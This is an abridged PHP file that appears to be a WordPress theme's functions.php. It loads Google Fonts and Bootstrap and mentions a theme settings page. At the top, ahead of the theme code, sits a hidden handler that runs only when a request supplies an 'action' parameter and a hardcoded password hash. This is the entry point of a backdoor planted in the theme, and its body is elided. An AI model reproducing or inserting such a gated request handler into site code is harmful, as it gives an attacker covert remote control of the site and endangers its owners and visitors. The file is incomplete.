<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'aed994de9747e7a331059b93a9088810'))
	{
...
function ct_custom_scripts() {
	...
	wp_enqueue_style( 'header-font', '//fonts.googleapis.com/css?family=Bebas+Neue&display=swap' );

	wp_enqueue_style( 'body-font', '//fonts.googleapis.com/css?family=Ubuntu&display=swap' );
	...
	wp_enqueue_script( 'bootstrap-js', 'https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.bundle.min.js', array(), null, true );
...
/**
 * Functions for creating the theme settings page.
 */
